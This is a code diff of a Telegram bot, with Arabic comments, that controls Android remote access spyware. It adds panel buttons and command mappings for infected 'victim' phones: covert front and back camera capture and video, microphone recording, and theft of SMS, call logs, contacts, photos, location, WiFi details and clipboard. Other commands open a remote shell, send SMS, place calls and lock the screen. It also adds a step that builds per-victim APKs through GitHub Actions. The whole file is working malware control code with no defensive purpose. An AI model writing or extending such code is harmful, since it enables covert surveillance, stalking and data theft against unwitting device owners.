@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# نسخة HTML (لا يوجد أخطاء Markdown)
+# نسخة HTML (لا يوجد أخطاء Markdown) — v2
 # ============================================================
 
 import io
@@ -80,57 +80,108 @@ def main_menu(user_id=None):
 
 
 def victim_commands_panel(victim_id):
+    """لوحة التحكم الكاملة بالضحية — مع كل الأوامر الجديدة"""
     m = InlineKeyboardMarkup()
+
+    # ═══════ الكاميرا ═══════
     m.row(
-        InlineKeyboardButton("📷 أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
-        InlineKeyboardButton("📸 خلفية", callback_data=f"vcmd_camback_{victim_id}"),
+        InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
+        InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"vcmd_camback_{victim_id}"),
     )
-    m.row(InlineKeyboardButton("🎥 فيديو 10s", callback_data=f"vcmd_video_{victim_id}"))
-    m.row(InlineKeyboardButton("🎙️ صوت 10s", callback_data=f"vcmd_audio_{victim_id}"))
+    m.row(
+        InlineKeyboardButton("🎥 فيديو أمامية 10s", callback_data=f"vcmd_videofront_{victim_id}"),
+        InlineKeyboardButton("🎥 فيديو خلفية 10s", callback_data=f"vcmd_videoback_{victim_id}"),
+    )
+
+    # ═══════ الصوت ═══════
+    m.row(
+        InlineKeyboardButton("🎙️ تسجيل صوت 10s", callback_data=f"vcmd_audio_{victim_id}"),
+    )
     m.row(
         InlineKeyboardButton("🔔 نغمة", callback_data=f"vcmd_sound_{victim_id}"),
         InlineKeyboardButton("🚨 إنذار", callback_data=f"vcmd_alarm_{victim_id}"),
     )
+
+    # ═══════ البيانات ═══════
     m.row(
-        InlineKeyboardButton("📱 معلومات", callback_data=f"vcmd_info_{victim_id}"),
-        InlineKeyboardButton("🔋 بطارية", callback_data=f"vcmd_battery_{victim_id}"),
+        InlineKeyboardButton("📱 معلومات الجهاز", callback_data=f"vcmd_info_{victim_id}"),
+        InlineKeyboardButton("🔋 البطارية", callback_data=f"vcmd_battery_{victim_id}"),
     )
     m.row(
         InlineKeyboardButton("📨 SMS", callback_data=f"vcmd_sms_{victim_id}"),
-        InlineKeyboardButton("📞 المكالمات", callback_data=f"vcmd_calls_{victim_id}"),
+        InlineKeyboardButton("📞 سجل المكالمات", callback_data=f"vcmd_calls_{victim_id}"),
     )
     m.row(
         InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"vcmd_contacts_{victim_id}"),
         InlineKeyboardButton("📲 التطبيقات", callback_data=f"vcmd_apps_{victim_id}"),
     )
+
+    # ═══════ الوسائط ═══════
     m.row(
         InlineKeyboardButton("🖼️ الصور", callback_data=f"vcmd_photos_{victim_id}"),
-        InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
+        InlineKeyboardButton("🎬 الفيديوهات", callback_data=f"vcmd_videos_{victim_id}"),
     )
-    m.row(InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"))
+
+    # ═══════ الموقع والشبكة ═══════
+    m.row(
+        InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
+        InlineKeyboardButton("📶 معلومات WiFi", callback_data=f"vcmd_wifi_{victim_id}"),
+    )
+    m.row(
+        InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"),
+    )
+
+    # ═══════ التحكم ═══════
     m.row(
         InlineKeyboardButton("📳 اهتزاز", callback_data=f"vcmd_vibrate_{victim_id}"),
         InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"vcmd_volmax_{victim_id}"),
     )
     m.row(
-        InlineKeyboardButton("💬 Toast", callback_data=f"vcmd_toast_{victim_id}"),
-        InlineKeyboardButton("💻 Shell", callback_data=f"vcmd_shell_{victim_id}"),
+        InlineKeyboardButton("🔉 خفض الصوت", callback_data=f"vcmd_volmute_{victim_id}"),
+        InlineKeyboardButton("⚡ صوت متوسط", callback_data=f"vcmd_volmid_{victim_id}"),
+    )
+
+    # ═══════ الميديا ═══════
+    m.row(
+        InlineKeyboardButton("⏯️ تشغيل/إيقاف", callback_data=f"vcmd_mediaplay_{victim_id}"),
+        InlineKeyboardButton("⏭️ التالي", callback_data=f"vcmd_medianext_{victim_id}"),
     )
     m.row(
-        InlineKeyboardButton("🔒 قفل", callback_data=f"vcmd_lock_{victim_id}"),
+        InlineKeyboardButton("⏮️ السابق", callback_data=f"vcmd_mediaprev_{victim_id}"),
+    )
+
+    # ═══════ الشاشة ═══════
+    m.row(
+        InlineKeyboardButton("🌑 إطفاء الشاشة", callback_data=f"vcmd_screenoff_{victim_id}"),
+        InlineKeyboardButton("🔒 قفل كامل", callback_data=f"vcmd_lock_{victim_id}"),
+    )
+    m.row(
         InlineKeyboardButton("🏠 الرئيسية", callback_data=f"vcmd_home_{victim_id}"),
     )
+
+    # ═══════ التواصل ═══════
     m.row(
         InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"vcmd_sendsms_{victim_id}"),
         InlineKeyboardButton("📞 مكالمة", callback_data=f"vcmd_call_{victim_id}"),
     )
-    m.row(InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"))
+    m.row(
+        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"),
+        InlineKeyboardButton("💬 Toast", callback_data=f"vcmd_toast_{victim_id}"),
+    )
+
+    # ═══════ متقدم ═══════
+    m.row(
+        InlineKeyboardButton("💻 Shell", callback_data=f"vcmd_shell_{victim_id}"),
+    )
+
+    # ═══════ الإدارة ═══════
     m.row(
         InlineKeyboardButton("🔄 تحديث", callback_data=f"v_refresh_{victim_id}"),
         InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"v_rename_{victim_id}"),
     )
     m.row(InlineKeyboardButton("🗑️ حذف الضحية", callback_data=f"v_delete_{victim_id}"))
     m.row(InlineKeyboardButton("🔙 رجوع للضحايا", callback_data="v_list"))
+
     return m
 
 
@@ -205,7 +256,7 @@ def callback_handler(call):
 
 
 def _handle_callback(call, chat_id, user_id, data):
-    """المنطق الفعلي للـ callback (مفصول عشان error handling)"""
+    """المنطق الفعلي للـ callback"""
 
     # ============================================================
     # قائمة الضحايا
@@ -285,6 +336,8 @@ def _handle_callback(call, chat_id, user_id, data):
         status = victim.get("status", "pending")
         device_id = victim.get("device_id", "—")
         model = victim.get("model", "—")
+        android = victim.get("android", "—")
+        brand = victim.get("brand", "—")
         last_seen = victim.get("last_seen")
 
         status_icon = "🟢 متصل" if status == "active" else "⏸️ في انتظار التثبيت"
@@ -296,8 +349,10 @@ def _handle_callback(call, chat_id, user_id, data):
                     last_str = f"قبل {int(diff)} ثانية"
                 elif diff < 3600:
                     last_str = f"قبل {int(diff/60)} دقيقة"
-                else:
+                elif diff < 86400:
                     last_str = f"قبل {int(diff/3600)} ساعة"
+                else:
+                    last_str = f"قبل {int(diff/86400)} يوم"
             except Exception:
                 pass
 
@@ -305,7 +360,8 @@ def _handle_callback(call, chat_id, user_id, data):
             f"👤 <b>{h(name)}</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"📊 الحالة: {status_icon}\n"
-            f"📱 الموديل: <code>{h(model)}</code>\n"
+            f"📱 الجهاز: <code>{h(brand)} {h(model)}</code>\n"
+            f"🤖 Android: <code>{h(android)}</code>\n"
             f"🆔 Device: <code>{h(device_id[:16]) if device_id else '—'}</code>\n"
             f"🕐 آخر ظهور: {last_str}\n\n"
             f"🎛️ <b>اختر الأمر:</b>"
@@ -329,13 +385,21 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
             return
 
+        # ★ خريطة الأوامر الكاملة
         action_map = {
+            # كاميرا
             "camfront": "camera_front",
             "camback": "camera_back",
+            "videofront": "camera_record_front",
+            "videoback": "camera_record_back",
             "video": "camera_record",
+
+            # صوت
             "audio": "record_audio",
             "sound": "play_sound",
             "alarm": "play_alarm",
+
+            # معلومات
             "info": "get_device_info",
             "battery": "get_battery",
             "sms": "get_sms",
@@ -343,18 +407,48 @@ def _handle_callback(call, chat_id, user_id, data):
             "contacts": "get_contacts",
             "apps": "get_apps",
             "photos": "get_photos",
+            "videos": "get_videos",
             "location": "get_location",
+            "wifi": "get_wifi_info",
             "clipboard": "get_clipboard",
+
+            # تحكم
             "vibrate": "vibrate",
             "volmax": "volume_max",
             "lock": "lock_screen",
             "home": "show_home",
+            "screenoff": "screen_off",
+
+            # ميديا
+            "mediaplay": "media_play_pause",
+            "medianext": "media_next",
+            "mediaprev": "media_previous",
         }
+
+        # ★ معالجة خاصة للصوت (levels)
+        if action == "volmute":
+            ok = queue_victim_command(victim_id, "volume_set",
+                                       level=0, stream="music")
+            if ok:
+                bot.answer_callback_query(call.id, "🔉 تم خفض الصوت")
+            else:
+                bot.answer_callback_query(call.id, "❌ فشل", show_alert=True)
+            return
+
+        if action == "volmid":
+            ok = queue_victim_command(victim_id, "volume_set",
+                                       level=8, stream="music")
+            if ok:
+                bot.answer_callback_query(call.id, "🔉 تم ضبط الصوت")
+            else:
+                bot.answer_callback_query(call.id, "❌ فشل", show_alert=True)
+            return
 
         if action in action_map:
             real_action = action_map[action]
             kwargs = {}
-            if action == "video":
+
+            if action in ("video", "videofront", "videoback"):
                 kwargs["duration"] = 10000
             elif action == "audio":
                 kwargs["duration"] = 10000
@@ -369,6 +463,7 @@ def _handle_callback(call, chat_id, user_id, data):
             logger.info(f"Command: {action} → {victim_id[:8]}")
             return
 
+        # ★ أوامر تحتاج إدخال نصي
         if action == "toast":
             bot.answer_callback_query(call.id)
             msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
@@ -383,7 +478,8 @@ def _handle_callback(call, chat_id, user_id, data):
 
         if action == "sendsms":
             bot.answer_callback_query(call.id)
-            msg = bot.send_message(chat_id, "✉️ <b>أرسل:</b> <code>رقم|نص</code>", parse_mode="HTML")
+            msg = bot.send_message(chat_id,
+                "✉️ <b>أرسل:</b> <code>رقم|نص</code>", parse_mode="HTML")
             bot.register_next_step_handler(msg, lambda m: v_sendsms_step(m, victim_id))
             return
 
@@ -904,7 +1000,9 @@ def _handle_callback(call, chat_id, user_id, data):
         target_chat_id = data.replace("rat_mic_", "")
         queue_command(target_chat_id, "audio")
         bot.answer_callback_query(call.id, "⏳ جاري التسجيل...")
-        return    # ============================================================
+        return
+
+    # ============================================================
     # LSH أوامر
     # ============================================================
     if data.startswith("lsh_snap_"):
@@ -1028,6 +1126,19 @@ def victim_name_step(message):
             except Exception as e:
                 logger.warning(f"edit_message_text error: {e}")
             return
+
+        # ★ تحديث الرسالة
+        try:
+            bot.edit_message_text(
+                f"✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
+                f"⏳ <i>جاري انتظار GitHub Actions...</i>\n"
+                f"🆔 Token: <code>{h(victim_token[:16])}</code>\n"
+                f"⏱️ <i>الوقت المتوقع: 2-5 دقائق</i>",
+                chat_id=chat_id, message_id=wait_msg.message_id,
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logger.warning(f"edit progress error: {e}")
 
         apk_url = get_victim_apk_url(victim_token, max_wait=900)
 
